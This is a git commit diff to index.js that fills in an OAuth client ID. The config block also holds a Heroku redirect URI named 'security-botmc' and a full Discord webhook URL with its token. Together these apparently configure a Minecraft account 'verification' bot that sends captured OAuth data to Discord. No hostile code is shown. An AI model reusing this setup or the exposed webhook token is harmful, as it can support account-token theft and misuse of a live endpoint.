03abc3d39c7c3f12c03be3b5e2abbd318f8f7014
gothgamergirl <117954061+gothgamergirl@users.noreply.github.com>
2022-11-10 17:56:27 -0600

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 //Config
 const client_secret = 'secret_value'
-const client_id = 'client_id'
+const client_id = '936a88f4-136c-4f7b-a955-b2cdf2e0ca0a'
 const redirect_uri = 'https://security-botmc.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1040413710679822357/0SstyWoEwPMUR7oOA4-iah8XGLfl6cQhYkk6JvVWGUdu53U2Gd4Umoq3CFU8RMwSEedd'
 //Requirements
